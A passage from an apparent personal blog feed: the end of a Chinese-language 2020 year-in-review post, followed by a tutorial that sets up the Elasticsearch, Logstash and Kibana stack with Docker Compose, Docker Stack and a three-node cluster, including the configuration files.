暂时不找工作了，静下心来想想职业规划，年后再找工作。为了不闲着也报了驾校，科一92分飘过，然科二至今排队中。</p><p>结婚，十二月我铁汁结婚，我当伴郎，参加过很多婚礼还是第一次当伴郎有点小紧张（也很累）。婚礼前一天单身夜，我们有五个人住一间电竞房，很兴奋也很怀念学生时期一起打游戏的日子。比较奇葩的是我们五个放着电脑不玩，却用手机玩起了王者荣耀开黑，我有打开过LOL发现根本不会了，别说电脑游戏不会了就连Windows系统都很陌生，工作一直用Mac和Linux。晚上12点多想睡一会，因为凌晨三点要起床，刚有睡意就听见隔壁的哥们再喊Q它Q它……2018年买了很多保险，当时有萌生一个想法不结婚不要孩子，可能受原生家庭影响，时至今日我也觉得单身可能会生活得很好，婚姻就是难得糊涂，想得太清楚很难结婚，我就是想得太多，可能再过几年会改变这种想法，谁知道呢……</p><p>静下来，现在人很浮躁，有时候需要静下心来多思考，不能跟着感觉走，想想工作、生活。当你的才华还撑不起你的野心时，那你就应该静下心来学习！2017年起有个计划，每年闭关两次，每次一到两个月，每年读完20本书。我刚统计了一下，这几年买了81本书，读完了48本，技术类书籍偏多，以后会读一些心理学和经济学类的书籍。</p><p>2021年，疫情还未结束，前两天还做了一波核酸检测。2021年没有大的计划，找一份理想的工作，顺利拿下驾照，平安健康。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;2020年，活着就好！&lt;/p&gt;
    
    </summary>
    
    
      <category term="Life" scheme="https://xinlichao.cn/categories/Life/"/>
    
    
      <category term="summary" scheme="https://xinlichao.cn/tags/summary/"/>
    
  </entry>
  
  <entry>
    <title>Elastic stack (ELK) on Docker</title>
    <link href="https://xinlichao.cn/back-end/docker/docker-elk/"/>
    <id>https://xinlichao.cn/back-end/docker/docker-elk/</id>
    <published>2020-08-01T20:30:00.000Z</published>
    <updated>2021-02-26T10:23:44.670Z</updated>
    
    <content type="html"><![CDATA[<p>The Elastic stack (ELK) powered by Docker and Compose.</p><a id="more"></a><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>By default, the stack exposes the following ports:</p><ul><li>5000: Logstash TCP input</li><li>9200: Elasticsearch HTTP</li><li>9300: Elasticsearch TCP transport</li><li>5601: Kibana</li></ul><p>正如官方所说的那样 <a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/vm-max-map-count.html，Elasticsearch默认使用mmapfs目录来存储索引。操作系统默认的mmap计数太低可能导致内存不足，可以使用下面这条命令来增加内存：" target="_blank" rel="noopener">https://www.elastic.co/guide/en/elasticsearch/reference/current/vm-max-map-count.html，Elasticsearch默认使用mmapfs目录来存储索引。操作系统默认的mmap计数太低可能导致内存不足，可以使用下面这条命令来增加内存：</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># grep vm.max_map_count /etc/sysctl.conf</span></span><br><span class="line"><span class="comment"># vm.max_map_count=262144</span></span><br><span class="line">sysctl -w vm.max_map_count=262144</span><br></pre></td></tr></table></figure><h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><p><strong>elasticsearch/config/elasticsearch.yml</strong></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="comment">## Default Elasticsearch configuration from Elasticsearch base image.</span></span><br><span class="line"><span class="comment">## https://github.com/elastic/elasticsearch/blob/master/distribution/docker/src/docker/config/elasticsearch.yml</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="attr">cluster.name:</span> <span class="string">"elasticsearch-cluster"</span></span><br><span class="line"><span class="attr">network.host:</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## X-Pack settings</span></span><br><span class="line"><span class="comment">## see https://www.elastic.co/guide/en/elasticsearch/reference/current/setup-xpack.html</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># xpack.license.self_generated.type: trial</span></span><br><span class="line"><span class="attr">xpack.license.self_generated.type:</span> <span class="string">basic</span></span><br><span class="line"><span class="attr">xpack.security.enabled:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">xpack.monitoring.collection.enabled:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p><strong>logstash/config/logstash.yml</strong></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="comment">## Default Logstash configuration from Logstash base image.</span></span><br><span class="line"><span class="comment">## https://github.com/elastic/logstash/blob/master/docker/data/logstash/config/logstash-full.yml</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="attr">http.host:</span> <span class="string">"0.0.0.0"</span></span><br><span class="line"><span class="attr">xpack.monitoring.elasticsearch.hosts:</span> <span class="string">[</span> <span class="string">"http://elasticsearch:9200"</span> <span class="string">]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## X-Pack security credentials</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="attr">xpack.monitoring.enabled:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">xpack.monitoring.elasticsearch.username:</span> <span class="string">elastic</span></span><br><span class="line"><span class="attr">xpack.monitoring.elasticsearch.password:</span> <span class="string">changeme</span></span><br></pre></td></tr></table></figure><p><strong>logstash/pipeline/logstash.conf</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">input &#123;</span><br><span class="line">tcp &#123;</span><br><span class="line">port &#x3D;&gt; 5000</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">## Add your filters &#x2F; logstash plugins configuration here</span><br><span class="line"></span><br><span class="line">output &#123;</span><br><span class="line">elasticsearch &#123;</span><br><span class="line">hosts &#x3D;&gt; &quot;elasticsearch:9200&quot;</span><br><span class="line">user &#x3D;&gt; &quot;elastic&quot;</span><br><span class="line">password &#x3D;&gt; &quot;changeme&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>kibana/config/kibana.yml</strong></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="comment">## Default Kibana configuration from Kibana base image.</span></span><br><span class="line"><span class="comment">## https://github.com/elastic/kibana/blob/master/src/dev/build/tasks/os_packages/docker_generator/templates/kibana_yml.template.js</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="attr">server.name:</span> <span class="string">kibana</span></span><br><span class="line"><span class="attr">server.host:</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line"><span class="attr">elasticsearch.hosts:</span> <span class="string">[</span> <span class="string">"http://elasticsearch:9200"</span> <span class="string">]</span></span><br><span class="line"><span class="attr">monitoring.ui.container.elasticsearch.enabled:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## X-Pack security credentials</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="attr">elasticsearch.username:</span> <span class="string">elastic</span></span><br><span class="line"><span class="attr">elasticsearch.password:</span> <span class="string">changeme</span></span><br></pre></td></tr></table></figure><h2 id="docker-compose"><a href="#docker-compose" class="headerlink" title="docker compose"></a>docker compose</h2><p><strong>docker-compose.yml</strong></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">'3.2'</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">elasticsearch:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">docker.elastic.co/elasticsearch/elasticsearch:7.8.0</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">bind</span></span><br><span class="line">        <span class="attr">source:</span> <span class="string">./elasticsearch/config/elasticsearch.yml</span></span><br><span class="line">        <span class="attr">target:</span> <span class="string">/usr/share/elasticsearch/config/elasticsearch.yml</span></span><br><span class="line">        <span class="attr">read_only:</span> <span class="literal">true</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">volume</span></span><br><span class="line">        <span class="attr">source:</span> <span class="string">elasticsearch</span></span><br><span class="line">        <span class="attr">target:</span> <span class="string">/usr/share/elasticsearch/data</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">"9200:9200"</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">"9300:9300"</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">ES_JAVA_OPTS:</span> <span class="string">"-Xmx512m -Xms512m"</span></span><br><span class="line">      <span class="attr">ELASTIC_PASSWORD:</span> <span class="string">changeme</span></span><br><span class="line">      <span class="comment"># Use single node discovery in order to disable production mode and avoid bootstrap checks</span></span><br><span class="line">      <span class="comment"># see https://www.elastic.co/guide/en/elasticsearch/reference/current/bootstrap-checks.html</span></span><br><span class="line">      <span class="attr">discovery.type:</span> <span class="string">single-node</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">elk</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">logstash:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">docker.elastic.co/logstash/logstash:7.8.0</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">bind</span></span><br><span class="line">        <span class="attr">source:</span> <span class="string">./logstash/config/logstash.yml</span></span><br><span class="line">        <span class="attr">target:</span> <span class="string">/usr/share/logstash/config/logstash.yml</span></span><br><span class="line">        <span class="attr">read_only:</span> <span class="literal">true</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">bind</span></span><br><span class="line">        <span class="attr">source:</span> <span class="string">./logstash/pipeline</span></span><br><span class="line">        <span class="attr">target:</span> <span class="string">/usr/share/logstash/pipeline</span></span><br><span class="line">        <span class="attr">read_only:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">"5000:5000/tcp"</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">"5000:5000/udp"</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">"9600:9600"</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">LS_JAVA_OPTS:</span> <span class="string">"-Xmx512m -Xms512m"</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">elk</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">elasticsearch</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">kibana:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">docker.elastic.co/kibana/kibana:7.8.0</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">bind</span></span><br><span class="line">        <span class="attr">source:</span> <span class="string">./kibana/config/kibana.yml</span></span><br><span class="line">        <span class="attr">target:</span> <span class="string">/usr/share/kibana/config/kibana.yml</span></span><br><span class="line">        <span class="attr">read_only:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">"5601:5601"</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">elk</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">elasticsearch</span></span><br><span class="line"></span><br><span class="line"><span class="attr">networks:</span></span><br><span class="line">  <span class="attr">elk:</span></span><br><span class="line">    <span class="attr">driver:</span> <span class="string">bridge</span></span><br><span class="line"></span><br><span class="line"><span class="attr">volumes:</span></span><br><span class="line">  <span class="attr">elasticsearch:</span></span><br></pre></td></tr></table></figure><h2 id="docker-stack"><a href="#docker-stack" class="headerlink" title="docker stack"></a>docker stack</h2><p><strong>docker-stack.yml</strong></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">'3.3'</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">elasticsearch:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">docker.elastic.co/elasticsearch/elasticsearch:7.8.0</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">"9200:9200"</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">"9300:9300"</span></span><br><span class="line">    <span class="attr">configs:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">source:</span> <span class="string">elastic_config</span></span><br><span class="line">        <span class="attr">target:</span> <span class="string">/usr/share/elasticsearch/config/elasticsearch.yml</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">ES_JAVA_OPTS:</span> <span class="string">"-Xmx512m -Xms512m"</span></span><br><span class="line">      <span class="attr">ELASTIC_PASSWORD:</span> <span class="string">changeme</span></span><br><span class="line">      <span class="comment"># Use single node discovery in order to disable production mode and avoid bootstrap checks</span></span><br><span class="line">      <span class="comment"># see https://www.elastic.co/guide/en/elasticsearch/reference/current/bootstrap-checks.html</span></span><br><span class="line">      <span class="attr">discovery.type:</span> <span class="string">single-node</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">elk</span></span><br><span class="line">    <span class="attr">deploy:</span></span><br><span class="line">      <span class="attr">mode:</span> <span class="string">replicated</span></span><br><span class="line">      <span class="attr">replicas:</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">logstash:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">docker.elastic.co/logstash/logstash:7.8.0</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">"5000:5000"</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">"9600:9600"</span></span><br><span class="line">    <span class="attr">configs:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">source:</span> <span class="string">logstash_config</span></span><br><span class="line">        <span class="attr">target:</span> <span class="string">/usr/share/logstash/config/logstash.yml</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">source:</span> <span class="string">logstash_pipeline</span></span><br><span class="line">        <span class="attr">target:</span> <span class="string">/usr/share/logstash/pipeline/logstash.conf</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">LS_JAVA_OPTS:</span> <span class="string">"-Xmx256m -Xms256m"</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">elk</span></span><br><span class="line">    <span class="attr">deploy:</span></span><br><span class="line">      <span class="attr">mode:</span> <span class="string">replicated</span></span><br><span class="line">      <span class="attr">replicas:</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">kibana:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">docker.elastic.co/kibana/kibana:7.8.0</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">"5601:5601"</span></span><br><span class="line">    <span class="attr">configs:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">source:</span> <span class="string">kibana_config</span></span><br><span class="line">        <span class="attr">target:</span> <span class="string">/usr/share/kibana/config/kibana.yml</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">elk</span></span><br><span class="line">    <span class="attr">deploy:</span></span><br><span class="line">      <span class="attr">mode:</span> <span class="string">replicated</span></span><br><span class="line">      <span class="attr">replicas:</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="attr">configs:</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">elastic_config:</span></span><br><span class="line">    <span class="attr">file:</span> <span class="string">./elasticsearch/config/elasticsearch.yml</span></span><br><span class="line">  <span class="attr">logstash_config:</span></span><br><span class="line">    <span class="attr">file:</span> <span class="string">./logstash/config/logstash.yml</span></span><br><span class="line">  <span class="attr">logstash_pipeline:</span></span><br><span class="line">    <span class="attr">file:</span> <span class="string">./logstash/pipeline/logstash.conf</span></span><br><span class="line">  <span class="attr">kibana_config:</span></span><br><span class="line">    <span class="attr">file:</span> <span class="string">./kibana/config/kibana.yml</span></span><br><span class="line"></span><br><span class="line"><span class="attr">networks:</span></span><br><span class="line">  <span class="attr">elk:</span></span><br><span class="line">    <span class="attr">driver:</span> <span class="string">overlay</span></span><br></pre></td></tr></table></figure><h2 id="ES-集群"><a href="#ES-集群" class="headerlink" title="ES 集群"></a>ES 集群</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建挂载路径并授予权限：</span></span><br><span class="line">mkdir esdatadir</span><br><span class="line">chmod g+rwx esdatadir</span><br><span class="line">chgrp 0 esdatadir</span><br><span class="line"></span><br><span class="line"><span class="comment"># chmod 777 esdatadir</span></span><br></pre></td></tr></table></figure><p><strong>kibana.yml</strong></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server.name:</span> <span class="string">kibana</span></span><br><span class="line"><span class="attr">server.host:</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line"><span class="attr">elasticsearch.hosts:</span> <span class="string">[</span> <span class="string">"http://es01:9200"</span><span class="string">,</span> <span class="string">"http://es02:9200"</span><span class="string">,</span> <span class="string">"http://es03:9200"</span> <span class="string">]</span></span><br><span class="line"><span class="attr">monitoring.ui.container.elasticsearch.enabled:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p><strong>logstash.yml</strong></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">http.host:</span> <span class="string">"0.0.0.0"</span></span><br><span class="line"><span class="attr">xpack.monitoring.elasticsearch.hosts:</span> <span class="string">[</span> <span class="string">"http://es01:9200"</span><span class="string">,</span> <span class="string">"http://es02:9200"</span><span class="string">,</span> <span class="string">"http://es03:9200"</span> <span class="string">]</span></span><br><span class="line"><span class="attr">xpack.monitoring.enabled:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p><strong>logstash.conf</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">input &#123;</span><br><span class="line">  tcp &#123;</span><br><span class="line">    mode &#x3D;&gt; &quot;server&quot;</span><br><span class="line">    host &#x3D;&gt; &quot;0.0.0.0&quot;</span><br><span class="line">    port &#x3D;&gt; 5000</span><br><span class="line">    codec &#x3D;&gt; json_lines</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">output &#123;</span><br><span class="line">  elasticsearch &#123;</span><br><span class="line">    hosts &#x3D;&gt; [&quot;es01:9200&quot;, &quot;es02:9200&quot;, &quot;es03:9200&quot;]</span><br><span class="line">    index &#x3D;&gt; &quot;smart-logstash-%&#123;+YYYY.MM.dd&#125;&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>docker-compose.yml</strong></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">'3.3'</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">cerebro:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">lmenezes/cerebro:0.9.2</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">cerebro</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">"9201:9000"</span></span><br><span class="line">    <span class="comment"># command:</span></span><br><span class="line">    <span class="comment">#   - -Dhosts.0.host=http://es01:9200</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">CEREBRO_PORT=9000</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">elastic</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">es01:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">docker.elastic.co/elasticsearch/elasticsearch:7.9.0</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">es01</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">node.name=es01</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">cluster.name=es-docker-cluster</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">discovery.seed_hosts=es02,es03</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">cluster.initial_master_nodes=es01,es02,es03</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">bootstrap.memory_lock=true</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">"ES_JAVA_OPTS=-Xms512m -Xmx512m"</span></span><br><span class="line">    <span class="attr">ulimits:</span></span><br><span class="line">      <span class="attr">memlock:</span></span><br><span class="line">        <span class="attr">soft:</span> <span class="number">-1</span></span><br><span class="line">        <span class="attr">hard:</span> <span class="number">-1</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">data01:/usr/share/elasticsearch/data</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">9200</span><span class="string">:9200</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">9300</span><span class="string">:9300</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">elastic</span></span><br><span class="line">  <span class="attr">es02:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">docker.elastic.co/elasticsearch/elasticsearch:7.9.0</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">es02</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">node.name=es02</span></span><br><span class="line">      <span 